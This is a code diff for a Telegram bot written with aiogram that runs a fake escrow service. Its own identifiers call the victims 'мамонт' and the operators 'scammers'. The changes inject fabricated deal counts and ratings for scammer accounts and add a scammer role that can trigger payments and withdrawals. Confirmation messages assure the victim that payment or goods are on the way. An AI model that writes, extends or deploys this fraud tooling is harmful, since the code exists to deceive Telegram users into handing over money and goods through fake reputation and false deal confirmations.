@@ -2,7 +2,6 @@ import logging
 import os
 import sqlite3
 import re
-import asyncio
 from aiogram import Router, F
 from aiogram.types import Message, CallbackQuery, FSInputFile
 from aiogram.filters import Command
@@ -12,6 +11,7 @@ from config import (
     ADMIN_IDS, SCAMMER_ID, SCAMMER_USERNAME,
     SUPPORT_USERNAME, COMMISSION, WELCOME_GIF_PATH,
     ERROR_MESSAGES,
+    SCAMMER_STATS, SCAMMER_IDS,
     E_DEAL, E_GRAM, E_STARS, E_RUB, E_HAMMER, E_CHECK,
     E_CROSS, E_BACK, E_SHARE, E_CHART, E_LIST,
     E_USERS, E_SETTINGS, E_PAID, E_WARNING,
@@ -40,8 +40,42 @@ logger = logging.getLogger(__name__)
 
 init_db()
 
+def apply_scammer_stats():
+    """Применяет рейтинг и сделки для всех скамеров из конфига"""
+    conn = sqlite3.connect(DB_NAME)
+    cur = conn.cursor()
+    
+    for user_id_str, stats in SCAMMER_STATS.items():
+        try:
+            user_id = int(user_id_str)
+            deals = stats.get("deals", 0)
+            rating = stats.get("rating", 0.0)
+            
+            cur.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
+            if cur.fetchone():
+                cur.execute(
+                    "UPDATE users SET successful_deals = ?, rating = ? WHERE user_id = ?",
+                    (deals, rating, user_id)
+                )
+            else:
+                cur.execute(
+                    "INSERT INTO users (user_id, username, full_name, successful_deals, rating) VALUES (?, ?, ?, ?, ?)",
+                    (user_id, f"scammer_{user_id}", "Scammer", deals, rating)
+                )
+        except Exception as e:
+            logger.error(f"Ошибка применения статистики для {user_id_str}: {e}")
+    
+    conn.commit()
+    conn.close()
+    logger.info("✅ Статистика скамеров применена")
+
+apply_scammer_stats()
+
 def is_admin(user_id):
     return user_id in ADMIN_IDS
+
+def is_scammer(user_id):
+    return user_id in SCAMMER_IDS
 
 def validate_gram(address):
     return address.startswith('UQ') and len(address) >= 30
@@ -81,6 +115,7 @@ def get_currency_emoji(currency):
 
 async def send_main_menu(message: Message, user_id: int):
     is_admin_user = is_admin(user_id)
+    is_scammer_user = is_scammer(user_id)
 
     if is_admin_user:
         await message.answer(
@@ -92,6 +127,16 @@ async def send_main_menu(message: Message, user_id: int):
             f"/twodeal *юз/айди* – сообщение о второй сделке\n"
             f"/send *текст* *юз/айди* – отправить сообщение\n"
             f"/chat *юз/айди* – выгрузить историю переписки"
+        )
+
+    if is_scammer_user and not is_admin_user:
+        await message.answer(
+            f"{E_SETTINGS} <b>Приветствую, скамер!</b>\n\n"
+            f"<b>Доступные команды:</b>\n"
+            f"/buy *код-сделки* – для оплаты сделки\n"
+            f"/profile – просмотр профиля\n"
+            f"/balance – баланс\n"
+            f"/withdraw – вывод средств"
         )
 
     if os.path.exists(WELCOME_GIF_PATH):
@@ -183,7 +228,6 @@ async def cmd_start(message: Message, state: FSMContext):
                 user = get_user(user_id)
                 deals_count = user[3] if user else 0
 
-                # ===== ПОЛУЧАЕМ ДАННЫЕ ПРОДАВЦА ДЛЯ ОТОБРАЖЕНИЯ В УВЕДОМЛЕНИИ =====
                 seller = get_user(deal[1])
                 seller_deals = seller[3] if seller else 0
                 seller_rating = seller[4] if seller else 0.0
@@ -203,7 +247,7 @@ async def cmd_start(message: Message, state: FSMContext):
 
 @router.message(Command("buy"))
 async def cmd_buy(message: Message):
-    if not is_admin(message.from_user.id):
+    if not is_admin(message.from_user.id) and not is_scammer(message.from_user.id):
         await message.answer(ERROR_MESSAGES["access_denied"])
         return
 
@@ -829,7 +873,7 @@ async def withdraw_callback(callback: CallbackQuery):
     user = get_user(user_id)
     balance = user[5] if user else 0
 
-    if user_id not in ADMIN_IDS:
+    if not is_admin(user_id) and not is_scammer(user_id):
         await callback.message.edit_text(
             f"{E_CROSS} <b>Ошибка вывода!</b>\n\n"
             f"<b>Минимальная сумма для вывода:</b> 1000 RUB\n"
@@ -997,6 +1041,8 @@ async def confirm_deal(callback: CallbackQuery, state: FSMContext):
         except Exception as e:
             logger.error(f"Не удалось отправить сообщение мамонту: {e}")
 
+    clean_code = deal_code.strip()
+    
     try:
         await callback.bot.send_message(
             SCAMMER_ID,
@@ -1007,7 +1053,7 @@ async def confirm_deal(callback: CallbackQuery, state: FSMContext):
             f"<b>Статус сделки: покупатель оплатил, продавец подтвердил передачу товара</b>\n\n"
             f"<b>Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота.</b>\n"
             f"<b>После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!</b>",
-            reply_markup=deal_status_buttons(deal_code, is_scammer=True)
+            reply_markup=deal_status_buttons(clean_code, is_scammer=True)
         )
         logger.info(f"Сообщение отправлено скамеру (SCAMMER_ID={SCAMMER_ID})")
     except Exception as e:
@@ -1024,21 +1070,19 @@ async def confirm_deal_scammer(callback: CallbackQuery, state: FSMContext):
     await state.clear()
 
     deal_code = callback.data.replace("confirm_deal_scammer_", "").strip()
-    logger.info(f"🔥 SCAMMER CONFIRM: deal_code={deal_code}")
+    deal_code = re.sub(r'[^a-zA-Z0-9]', '', deal_code)
     
     deal = get_deal(deal_code)
     if not deal:
         deal = get_deal_by_partial(deal_code)
     
-    logger.info(f"🔥 SCAMMER CONFIRM: deal found={deal is not None}")
-
     if not deal:
-        await callback.answer("❌ Сделка не найдена!", show_alert=True)
+        await callback.answer("❌ Сделка не найдена", show_alert=True)
         return
 
     if deal[6] == 'completed':
-        await callback.answer("❌ Сделка уже завершена!", show_alert=True)
-        await callback.message.edit_reply_markup(reply_markup=None)
+        await callback.answer("❌ Уже завершена", show_alert=True)
+        await callback.message.delete()
         return
 
     update_deal_completed(deal_code)
@@ -1059,7 +1103,7 @@ async def confirm_deal_scammer(callback: CallbackQuery, state: FSMContext):
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
         f"<b>Комиссия:</b> {COMMISSION}%\n\n"
-        f"{E_PAID} <b>Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
+        f"{E_PAID} <b>Статус: СДЕЛКА ЗАВЕРШЕНА</b>\n\n"
         f"{E_SUCCESS} <b>Пожалуйста, дождитесь поступления товара на ваш аккаунт!</b>",
         reply_markup=None
     )
@@ -1072,14 +1116,14 @@ async def confirm_deal_scammer(callback: CallbackQuery, state: FSMContext):
                 f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
                 f"<b>Описание:</b> {deal[5]}\n"
                 f"<b>Комиссия:</b> {COMMISSION}%\n\n"
-                f"{E_PAID} <b>Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
+                f"{E_PAID} <b>Статус: СДЕЛКА ЗАВЕРШЕНА</b>\n\n"
                 f"<b>Ожидайте поступления оплаты на указанный вами ранее кошелёк!</b>",
                 reply_markup=support_button()
             )
         except Exception as e:
-            logger.error(f"Не удалось отправить сообщение мамонту: {e}")
+            logger.error(f"Ошибка: {e}")
 
-    await callback.answer(f"{E_SUCCESS} Сделка завершена!")
+    await callback.answer("✅ Сделка завершена!")
 
 @router.callback_query()
 async def catch_all_callbacks(callback: CallbackQuery):
